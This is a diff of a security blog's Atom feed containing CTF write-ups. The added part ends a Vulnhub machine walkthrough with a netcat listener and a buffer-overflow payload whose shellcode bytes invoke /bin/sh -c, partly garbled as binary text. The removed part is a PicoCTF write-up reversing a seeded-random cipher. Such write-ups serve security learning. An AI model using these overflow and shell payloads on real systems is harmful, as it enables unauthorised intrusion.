+&lt;span class=&quot;gp&quot;&gt;root@kali:~# &lt;/span&gt;nc -lp 6666
+RUN /aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaTROLLOOOLLO���j
+                X�Rfh-c��h/shh/bin��R�8YAY FL46_7:9tjt86evvcywuuf774hr88eui3nus8dlk 2&amp;gt;/tmp/huhWS��̀j
+                   X�Rfh-c��h/shh/bin��R�8YAY FL46_7:9tjt86evvcywuuf774hr88eui3nus8dlk 2&amp;gt;/tmp/huhWS��̀j
+                      X�Rfh-c��h/shh/bin��R�8YAY FL46_7:9tjt86evvcywuuf774hr88eui3nus8dlk 2&amp;gt;/tmp/huhWS��̀j
+                         X�Rfh-c��h/shh/bin��R�8YAY FL46_7:9tjt86evvcywuuf774hr88eui3nus8dlk 2&amp;gt;/tmp/huhWS��̀j
+                            X�Rfh-c��h/shh/bin��R�8YAY FL46_7:9tjt86evvcywuuf774hr88eui3nus8dlk 2&amp;gt;/tmp/huhWS��̀j
+                               X�Rfh-c��h/shh/bin��R�-N3v3r As5um3! 1t M4k35 4n 455 0f y0u &amp;amp; m3 :DWS��̀ HTTTPEE/1.1&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;We have the last flag! &lt;/p&gt;
+
+&lt;h1&gt;Last words&lt;/h1&gt;
+
+&lt;p&gt;It was really frustrating, long and amazingly fun machine. I really enjoyed solving the challenges, even though they were taking me a lot of time and few headaches. Thanks a lot to &lt;a href=&quot;https://3mrgnc3.ninja/&quot;&gt;&lt;b&gt;3mrgnc3&lt;/b&gt;&lt;/a&gt; for creating this challenge, and to &lt;a href=&quot;https://www.vulnhub.com/&quot;&gt;&lt;b&gt;Vulnhub&lt;/b&gt;&lt;/a&gt;, for hosting it. Hope you had fun reading this, and as always... &lt;/p&gt;
+
+&lt;p&gt;~ Stay safe!&lt;/p&gt;</content><author><name>W3ndige</name></author><category term="Vulnhub" /><summary type="html">Introduction</summary></entry><entry><title type="html">Nebula 01</title><link href="http://localhost:4000/nebula-1/" rel="alternate" type="text/html" title="Nebula 01" /><published>2017-06-07T00:00:00+00:00</published><updated>2017-06-07T00:00:00+00:00</updated><id>http://localhost:4000/nebula-1</id><content type="html" xml:base="http://localhost:4000/nebula-1/">&lt;h1&gt;Introduction&lt;/h1&gt;
 
 &lt;p&gt;Let's start another challenge from Nebula machine and see what's our target this time. &lt;/p&gt;
 
@@ -893,60 +1697,4 @@ password: asd&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
 &lt;p&gt;Great SQL Injection challenge! &lt;/p&gt;
 
-&lt;p&gt;~ Stay safe!&lt;/p&gt;</content><author><name>W3ndige</name></author><category term="PicoCTF 2017" /><summary type="html">A Happy Union - 110 PTS</summary></entry><entry><title type="html">PicoCTF - SoRandom</title><link href="http://localhost:4000/picoctf-sorandom/" rel="alternate" type="text/html" title="PicoCTF - SoRandom" /><published>2017-04-15T00:00:00+00:00</published><updated>2017-04-15T00:00:00+00:00</updated><id>http://localhost:4000/picoctf-sorandom</id><content type="html" xml:base="http://localhost:4000/picoctf-sorandom/">&lt;h1&gt;SoRandom - 75 PTS&lt;/h1&gt;
-
-&lt;p&gt;We found sorandom.py running at shell2017.picoctf.com:42263. It seems to be outputting the flag but randomizing all the characters first. Is there anyway to get back the original flag?&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;c&quot;&gt;#!/usr/bin/python -u&lt;/span&gt;
-&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;random&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nn&quot;&gt;string&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;FLAG:&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;flag&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;r&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()[:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;encflag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;random&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;seed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;random&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;islower&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
-    &lt;span class=&quot;c&quot;&gt;#rotate number around alphabet a random amount&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;encflag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'a'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;random&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;randrange&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;26&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;26&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'a'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
-  &lt;span class=&quot;k&quot;&gt;elif&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;isupper&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;encflag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'A'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;random&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;randrange&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;26&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;26&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'A'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
-  &lt;span class=&quot;k&quot;&gt;elif&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;isdigit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;encflag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'0'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;random&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;randrange&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'0'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
-  &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;encflag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Unguessably Randomized Flag: &quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encflag&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;How this code works? Firstly it opens the flag file, reading its content, then it creates a loop which will iterate every letter in the flag string. Then, these 3 'if' statements check, whether or not the letter is lowercase, uppercase or digit, and according to that, it will append some random number to the ASCII value of a letter. Those random values were firstly seeded with a work &lt;b&gt;random&lt;/b&gt;, meaning that everytime the code starts running, it will generate the same output. &lt;/p&gt;
-
-&lt;p&gt;We can simply crack it, by reversing the scheme and simply substracting those values. By firstly, let's connect to the server to get the encrypted flag. &lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;w3ndige@W3ndige ~&amp;gt; nc shell2017.picoctf.com 42263
-Unguessably Randomized Flag: BNZQ:8o149b15764q471k2533971t6w78liec&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Now we can change the code. &lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;c&quot;&gt;#!/usr/bin/python -u&lt;/span&gt;
-&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;random&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nn&quot;&gt;string&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;BNZQ:8o149b15764q471k2533971t6w78liec&quot;&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;encflag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;random&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;seed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;random&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;islower&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
-    &lt;span class=&quot;c&quot;&gt;#rotate number around alphabet a random amount&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;encflag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'a'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;random&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;randrange&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;26&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;26&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'a'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
-  &lt;span class=&quot;k&quot;&gt;elif&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;isupper&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;encflag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'A'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;random&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;randrange&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;26&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;26&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'A'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
-  &lt;span class=&quot;k&quot;&gt;elif&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;isdigit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;encflag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'0'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;random&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;randrange&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'0'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
-  &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;encflag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Unguessably Randomized Flag: &quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encflag&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;And lastly, let's run this code once again on our local computer. Remember to use &lt;b&gt;python2&lt;/b&gt;!&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;w3ndige@W3ndige ~/Pobrane&amp;gt; python2 sorandom.py
-Unguessably Randomized Flag: FLAG:5d968c92267e701f5846515f1b31deab&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Here we go. &lt;/p&gt;
-
-&lt;p&gt;~ Stay safe!&lt;/p&gt;</content><author><name>W3ndige</name></author><category term="PicoCTF 2017" /><summary type="html">SoRandom - 75 PTS</summary></entry></feed>
+&lt;p&gt;~ Stay safe!&lt;/p&gt;</content><author><name>W3ndige</name></author><category term="PicoCTF 2017" /><summary type="html">A Happy Union - 110 PTS</summary></entry></feed>
